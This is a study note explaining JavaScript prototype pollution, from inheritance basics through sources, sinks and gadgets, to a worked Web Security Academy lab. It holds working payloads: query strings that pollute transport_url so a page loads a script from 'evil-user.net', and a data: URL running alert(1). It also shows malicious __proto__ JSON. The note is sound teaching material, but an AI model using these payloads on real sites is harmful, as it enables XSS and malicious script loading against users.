-----------------

#### Prototype Pollution

-----------------

- Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects
- Although, prototype pollution is meant to be chained as a gadget with another vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution.

------------------

### Prototype and Inheritance in Javascript

------------------

- Javascript uses a prototypal-inheritance model compared to class-model used by other programming languages.
- Objects in js-:It consist of `key:value` pair known as properties.e.g

```js
const user = {name: "Andrew",age: 15,role: "admin"};
```

- Access it via bracket notation or dot notation-:

```js
user.name //Andrew
user['name'] //Andrew
```

- As well as data, properties may also contain executable functions. In this case, the function is known as a "method".

```js
const user = {name: "Andrew",age: 15,role: "admin",isAdmin: function() {if (this.role === 'admin'){ return true; } else {return false;}}};
```

- The example above is an "object literal", which means it was created using curly brace syntax to explicitly declare its properties and their initial values. However, it's important to understand that almost everything in JavaScript is an object under the hood. Throughout these materials, the term "object" refers to all entities, not just object literals.

---------------

### Prototype in Javascript

---------------

- Every object in JavaScript is linked to another object of some kind, known as its prototype. By default, JavaScript automatically assigns new objects one of its built-in prototypes. For example, strings are automatically assigned the built-in String.prototype.
- For example-:

```js
let myString = "";
Object.getPrototypeOf(myString); //String
```

- Inheritance way of life in Javascript-: When javascript tries to check a property for an object, it checks if it exists in the object but if it is non-existent, it checks the object's prototype.
- The prototype chain-: Note that an object's prototype is just another object, which should also have its own prototype, and so on. As virtually everything in JavaScript is an object under the hood, this chain ultimately leads back to the top-level Object.prototype, whose prototype is simply null.

<img width="838" height="472" alt="image" src="https://github.com/user-attachments/assets/4cfcd0de-8e97-453a-a658-d2e3f5ad89f1" />

- Crucially, objects inherit properties not just from their immediate prototype, but from all objects above them in the prototype chain. In the example above, this means that the username object has access to the properties and methods of both String.prototype and Object.prototype.


---------------

### Accessing an object's prototype using `__proto__`

----------------

- Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, __proto__ is the de facto standard used by most browsers. If you're familiar with object-oriented languages, this property serves as both a getter and setter for the object's prototype. This means you can use it to read the prototype and its properties, and even reassign them if necessary.As with any property, you can access __proto__ using either bracket or dot notation:

```js
let username = "sensei";
username.__proto__; //String.prototype
username.__proto__.__proto__; //Objeect.prototype
username.__proto__.__proto__.__proto__; //null
```

- Although it's generally considered bad practice, it is possible to modify JavaScript's built-in prototypes just like any other object. This means developers can customize or override the behavior of built-in methods, and even add new methods to perform useful operations.

----------------

### How the vulnerabiity arises

----------------

- It occurs a javascript function recursively merges object controllable user input into an existing object without sanitizing the key.This can allow an attacker to inject a property with a key like __proto__, along with arbitrary nested properties.The merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.
- It is possible to pollute an object but with theh `Object.prototype`.
- Key Components-:
  - A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
  - A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
  - An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

-------------- 

### Components

---------------

- A prototype pollution source is any input that enables you to poison prototype objects with arbitrary properties.
  - The URL via either the query or fragment string (hash)
  - JSON-based input
  - Web messages
 
- Pollution via url-: Example

```url
https://loclahost:5000/?__proto__[evilSink]=payload
```

- You might think that the __proto__ property, along with its nested evilProperty, will just be added to the target object as follows:-:

```js
{__proto__:{evilSink: 'payload' } }
```

- But it'll be like this

```js
targetObject.__proto__.evilSink = payload;
```

- During this assignment, the JavaScript engine treats __proto__ as a getter for the prototype. As a result, evilProperty is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default Object.prototype, all objects in the JavaScript runtime will now inherit evilProperty, unless they already have a property of their own with a matching key.
- In practice, injecting a property called evilProperty is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.

- Prototype pollution via JSON input-:
  - User-controllable objects are often derived from a JSON string using the JSON.parse() method. Interestingly, JSON.parse() also treats any key in the JSON object as an arbitrary string, including things like __proto__. This provides another potential vector for prototype pollution.
  - Malicious JSON-:
  ```json
  {
    "__proto__": {
        "evilProperty": "payload"
    }
  }
  ```
  - If this is converted into a JavaScript object via the JSON.parse() method, the resulting object will in fact have a property with the key __proto__:
  ```js
  const objectLiteral = {__proto__: {evilProperty: 'payload'}};
  const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

  objectLiteral.hasOwnProperty('__proto__');     // false
  objectFromJson.hasOwnProperty('__proto__');    // true
  ```
  - If the object created via JSON.parse() is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example.

- A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on DOM XSS.As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.
- An exploitable gadget-: A gadget is a way of turning it into an exploit e.g
  - Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
  - Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

- Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:

```js
let transport_url = config.transport_url || defaults.transport_url;
```
- Now imagine the library code uses this transport_url to add a script reference to the page:

```js
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

- If the website's developers haven't set a transport_url property on their config object, this is a potential gadget. In cases where an attacker is able to pollute the global Object.prototype with their own transport_url property, this will be inherited by the config object and, therefore, set as the src for this script to a domain of the attacker's choosing.
- If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:

```js
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

- By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows:

```js
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```
- Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix.

---------------

### Client Side Prototype Pollution

--------------

- First Challenge-:

```url
https://0a94002a0497549a803b037c00ac00cc.web-security-academy.net/?__proto__[transport_url]=data:,alert(1);//
```
 - Sink/gadget(transport_url ain't defined)-:
```js
let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
```
- Pollution source in deparam-:

```js
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );
            keys = keys.shift().split('[').concat( keys );
            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[key] = i < keys_last
                        ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[key].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[key] = [ obj[key], val ];
                } else {
                    obj[key] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};
```
- 2nd Challenge(DOM XSS via an alternative prototype pollution vector)-:

```url

```


-------------
